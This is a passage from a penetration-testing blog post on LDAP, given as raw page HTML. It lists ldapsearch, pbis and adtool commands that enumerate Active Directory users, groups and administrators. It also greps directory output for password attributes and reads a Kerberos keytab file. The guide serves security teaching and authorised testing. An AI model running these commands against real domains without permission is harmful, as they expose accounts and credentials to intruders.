</pre></table></code></div></div><p>If you find something saying that the <code class="language-plaintext highlighter-rouge">bind must be completed</code> means that the credentials are incorrect.</p><h3 id="you-can-extract-everything-from-a-domain-using"><span class="mr-2">You can extract everything from a domain using</span><a href="#you-can-extract-everything-from-a-domain-using" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.x.x <span class="nt">-D</span> <span class="s1">'secybr.com\0xhav0c'</span> <span class="nt">-w</span> <span class="s1">'Password'</span> <span class="nt">-b</span> <span class="s2">"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"</span>
<span class="nt">-x</span> Simple Authentication
<span class="nt">-h</span> LDAP Server
<span class="nt">-D</span> My User
<span class="nt">-w</span> My password
<span class="nt">-b</span> Base site, all data from here will be given
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/ldap/ldap7.png" alt="Untitled" data-proofer-ignore></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c">#Extract users:</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.x.x <span class="nt">-D</span> <span class="s1">'secybr.com\0xhav0c'</span> <span class="nt">-w</span> <span class="s1">'Password'</span> <span class="nt">-b</span> <span class="s2">"CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"</span>

<span class="c">#Extract computers:</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.x.x <span class="nt">-D</span> <span class="s1">'secybr.com\0xhav0c'</span> <span class="nt">-w</span> <span class="s1">'Password'</span> <span class="nt">-b</span> <span class="s2">"CN=Computers,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"</span>

<span class="c">#Extract my info:</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.x.x <span class="nt">-D</span> <span class="s1">'secybr.com\0xhav0c'</span> <span class="nt">-w</span> <span class="s1">'Password'</span> <span class="nt">-b</span> <span class="s2">"CN=&lt;MY NAME&gt;,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"</span>

<span class="c">#Extract Domain Admins:</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.x.x <span class="nt">-D</span> <span class="s1">'secybr.com\0xhav0c'</span> <span class="nt">-w</span> <span class="s1">'Password'</span> <span class="nt">-b</span> <span class="s2">"CN=Domain Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"</span>

<span class="c">#Extract Domain Users:</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.x.x <span class="nt">-D</span> <span class="s1">'secybr.com\0xhav0c'</span> <span class="nt">-w</span> <span class="s1">'Password'</span> <span class="nt">-b</span> <span class="s2">"CN=Domain Users,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"</span>

<span class="c">#Extract Enterprise Admins:</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.x.x <span class="nt">-D</span> <span class="s1">'secybr.com\0xhav0c'</span> <span class="nt">-w</span> <span class="s1">'Password'</span> <span class="nt">-b</span> <span class="s2">"CN=Enterprise Admins,CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"</span>

<span class="c">#Extract Administrators:</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.x.x <span class="nt">-D</span> <span class="s1">'secybr.com\0xhav0c'</span> <span class="nt">-w</span> <span class="s1">'Password'</span> <span class="nt">-b</span> <span class="s2">"CN=Administrators,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"</span>

<span class="c">#Extract Remote Desktop Group:</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.x.x <span class="nt">-D</span> <span class="s1">'secybr.com\0xhav0c'</span> <span class="nt">-w</span> <span class="s1">'Password'</span> <span class="nt">-b</span> <span class="s2">"CN=Remote Desktop Users,CN=Builtin,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"</span>
</pre></table></code></div></div><p>To see if you have access to any password you can use grep after executing one of the queries:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;ldapsearchcmd...&gt; | <span class="nb">grep</span> <span class="nt">-i</span> <span class="nt">-A2</span> <span class="nt">-B2</span> <span class="s2">"userpas"</span>
</pre></table></code></div></div><p>Please, notice that the passwords that you can find here could not be the real ones…</p><h3 id="pbis"><span class="mr-2">pbis</span><a href="#pbis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>You can download pbis from here: <a href="https://github.com/BeyondTrust/pbis-open/">https://github.com/BeyondTrust/pbis-open/</a> and it’s usually installed in <code class="language-plaintext filepath highlighter-rouge">/opt/pbis</code>.</p><p>Pbis allow you to get basic information easily:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="c">#Read keytab file</span>
./klist <span class="nt">-k</span> /etc/krb5.keytab

<span class="c">#Get known domains info</span>
./get-status
./lsa get-status

<span class="c">#Get basic metrics</span>
./get-metrics
./lsa get-metrics

<span class="c">#Get users</span>
./enum-users
./lsa enum-users

<span class="c">#Get groups</span>
./enum-groups
./lsa enum-groups

<span class="c">#Get all kind of objects</span>
./enum-objects
./lsa enum-objects

<span class="c">#Get groups of a user</span>
./list-groups-for-user &lt;username&gt;
./lsa list-groups-for-user &lt;username&gt;
<span class="c">#Get groups of each user</span>
./enum-users | <span class="nb">grep</span> <span class="s2">"Name:"</span> | <span class="nb">sed</span> <span class="nt">-e</span> <span class="s2">"s,</span><span class="se">\\\,\\\\\\\,</span><span class="s2">g"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="k">while </span><span class="nb">read </span>name<span class="p">;</span> <span class="k">do</span> ./list-groups-for-user <span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span><span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"========================</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>

<span class="c">#Get users of a group</span>
./enum-members <span class="nt">--by-name</span> <span class="s2">"domain admins"</span>
./lsa enum-members <span class="nt">--by-name</span> <span class="s2">"domain admins"</span>
<span class="c">#Get users of each group</span>
./enum-groups | <span class="nb">grep</span> <span class="s2">"Name:"</span> | <span class="nb">sed</span> <span class="nt">-e</span> <span class="s2">"s,</span><span class="se">\\\,\\\\\\\,</span><span class="s2">g"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="k">while </span><span class="nb">read </span>name<span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span><span class="p">;</span> ./enum-members <span class="nt">--by-name</span> <span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span><span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"========================</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>

<span class="c">#Get description of each user</span>
./adtool <span class="nt">-a</span> search-user <span class="nt">--name</span> <span class="nv">CN</span><span class="o">=</span><span class="s2">"*"</span> <span class="nt">--keytab</span><span class="o">=</span>/etc/krb5.keytab <span class="nt">-n</span> 0xhav0c| <span class="nb">grep</span> <span class="s2">"CN"</span> | <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do
    </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span><span class="p">;</span>
    ./adtool <span class="nt">--keytab</span><span class="o">=</span>/etc/krb5.keytab <span class="nt">-n</span> 0xhav0c-a lookup-object <span class="nt">--dn</span><span class="o">=</span><span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span> <span class="nt">--attr</span> <span class="s2">"description"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"======================"</span>
<span class="k">done</span>
</pre></table></code></div></div><h3 id="apache-directory"><span class="mr-2">Apache Directory</span><a href="#apache-directory" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Download Apache Directory from here. You can find an example of how to use this tool here.</p><p>You can download a graphical interface with LDAP server here: <a href="http://www.jxplorer.org/downloads/users.html">http://www.jxplorer.org/downloads/users.html</a></p><p>By default is is installed in: <code class="language-plaintext filepath highlighter-rouge">/opt/jxplorer</code></p><p><img data-src="/assets/img/pitcures/ldap/ldap8.png" alt="Untitled" data-proofer-ignore></p><p><img data-src="/assets/img/pitcures/ldap/ldap9.png" alt="Untitled" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pentesting-protocols/'>pentesting protocols</a>, <a href='/categories/ldap/'>ldap</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >pentesting</a> <a href="/tags/ldap/" class="post-tag no-text-decoration" >ldap</a> <a href="/tags/best-practicies/" class="post-tag no-text-decoration" >best practicies</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=LDAP+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks.&url=https%3A%2F%2Fsecybr.com%2Fposts%2Fldap-pentesting-best-practices%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=LDAP+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks.&u=https%3A%2F%2Fsecybr.com%2Fposts%2Fldap-pentesting-best-practices%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fsecybr.com%2Fposts%2Fldap-pentesting-best-practices%2F&text=LDAP+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks." data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/subdomain-enumeration-methods/">Subdomain Enumeration Methods</a><li><a href="/posts/shodan-tutorials-for-best-practicies/">Shodan.io Tutorials for Best Practices</a><li><a href="/posts/collecting-target-email-address/">Collecting Target Email Addresses</a><li><a href="/posts/evasion-tactics-for-scanning-targets/">Evasion Tactics For Scanning Targets (Active Scan)</a><li><a href="/posts/dumping-lsass-without-mimikatz/">Dumping LSASS Without Mimikatz</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/best-practicies/">best practicies</a> <a class="post-tag" href="/tags/red-team/">red-team</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/active-scan-evasion-tactics/">active scan evasion tactics</a> <a class="post-tag" href="/tags/asset-discovery-methods/">asset discovery methods</a> <a class="post-tag" href="/tags/asset-discovery/">asset discovery</a> <a class="post-tag" href="/tags/asset-enumeration-methods/">asset enumeration methods</a> <a class="post-tag" href="/tags/assets-of-target/">assets of target</a> <a class="post-tag" href="/tags/attack-detection-mechanism/">attack detection mechanism</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/ftp-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654290000" data-df="ll" > Jun 4, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FTP Pentesting Best Practices</h3><div class="text-muted small"><p> FTP FTP usually uses port 21 What is FTP? FTP (File Transfer Protocol) is used to communicate and transfer files between computers on a TCP/IP (Transmission Control Protocol/Internet Protoco...</p></div></div></a></div><div class="card"> <a href="/posts/telnet-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654290000" data-df="ll" > Jun 4, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Telnet Pentesting Best Practices</h3><div class="text-muted small"><p> Telnet Telnet usually uses port 23,992 What is Telnet? Telnet is a network protocol used to virtually access a computer and to provide a two-way, collaborative and text-based communication c...</p></div></div></a></div><div class="card"> <a href="/posts/finger-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654376400" data-df="ll" > Jun 5, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Finger Pentesting Best Practices</h3><div class="text-muted small"><p> Finger Finger usually uses port 79 What is Finger? Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly othe...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/msrpc-pentesting-best-practices/" class="btn btn-outline-primary" prompt="Older"><p>MSRPC Pentesting Best Practices</p></a> <a href="/posts/imap-pentesting-best-practices/" class="btn btn-outline-primary" prompt="Newer"><p>IMAP Pentesting Best Practices</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://secybr.com/posts/ldap-pentesting-best-practices/'; this.page.identifier = '/posts/ldap-pentesting-best-practices/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://secybr-com.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><div class="row justify-content-center border-top"> <small class="my-4">Powered by <a href="https://twitter.com/0xhav0c" target="_blank" rel="noopener noreferrer">0xhav0c</a> © 2022 - <a href="/privacy-policy/">Privacy Policy</a> </small></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/best-practicies/">best practicies</a> <a class="post-tag" href="/tags/red-team/">red-team</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/active-scan-evasion-tactics/">active scan evasion tactics</a> <a class="post-tag" href="/tags/asset-discovery-methods/">asset discovery methods</a> <a class="post-tag" href="/tags/asset-discovery/">asset discovery</a> <a class="post-tag" href="/tags/asset-enumeration-methods/">asset enumeration methods</a> <a class="post-tag" href="/tags/assets-of-target/">assets of target</a> <a class="post-tag" href="/tags/attack-detection-mechanism/">attack detection mechanism</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-XBEEHR73W1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-XBEEHR73W1'); }); </script>
